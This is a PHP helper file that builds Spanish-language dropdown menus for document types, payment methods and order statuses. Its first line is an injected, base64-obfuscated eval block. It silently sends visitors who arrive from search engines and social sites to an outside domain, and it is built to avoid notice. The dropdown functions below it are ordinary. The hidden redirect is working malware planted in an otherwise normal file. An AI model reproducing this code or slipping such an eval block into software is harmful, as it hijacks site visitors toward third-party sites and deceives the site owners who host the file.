<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));

function dropTipos($filter, $selected, $mode = 1) {
    echo "<select class='filtersel' filter='$filter'>";
    if ($mode == 1)
        echo "<option value='null'>(Todos)</option>";
    echo "<option " . (1 == $selected ? "selected='selected'" : "") . " value='1'>Balance Individual</option>";
    echo "<option " . (2 == $selected ? "selected='selected'" : "") . "value='2'>Balance Conyugal</option>";
    echo "<option " . (3 == $selected ? "selected='selected'" : "") . "value='3'>Certificado de Ingresos</option>";
    echo "</select>";
}

function dropTiposPago($filter, $selected, $mode = 1) {
    echo "<select class='filtersel' filter='$filter'>";
    if ($mode == 1)
        echo "<option value='null'>(Todos)</option>";
    echo "<option " . (1 == $selected ? "selected='selected'" : "") . " value='1'>Deposito</option>";
    echo "<option " . (2 == $selected ? "selected='selected'" : "") . "value='2'>Transferencia</option>";
    echo "<option " . (3 == $selected ? "selected='selected'" : "") . "value='3'>Tarjeta de Credito</option>";
    echo "</select>";
}

function dropVerificacionPago($filter, $selected, $mode = 1) {
    echo "<select class='filtersel' filter='$filter'>";
    if ($mode == 1)
    echo "<option value='null'>(Todos)</option>";
    echo "<option " . (1 == $selected ? "selected='selected'" : "") . " value='0'>Por Revision</option>";
    echo "<option " . (2 == $selected ? "selected='selected'" : "") . "value='1'>Pagado</option>";
    echo "</select>";
}

function dropStatus($filter, $selected, $mode = 1) {
    echo "<select class='filtersel' filter='$filter'>";
    if ($mode == 1)
        echo "<option value='null'>(Todos)</option>";
    echo "<option " . (1 == $selected ? "selected='selected'" : "") . " value='1'>POR PAGAR</option>";
    echo "<option " . (2 == $selected ? "selected='selected'" : "") . "value='2'>VALIDANDO PAGO</option>";
    echo "<option " . (3 == $selected ? "selected='selected'" : "") . "value='3'>EN TRANSITO</option>";
    echo "<option " . (4 == $selected ? "selected='selected'" : "") . "value='4'>COMPLETADO</option>";
    echo "</select>";
}
?>
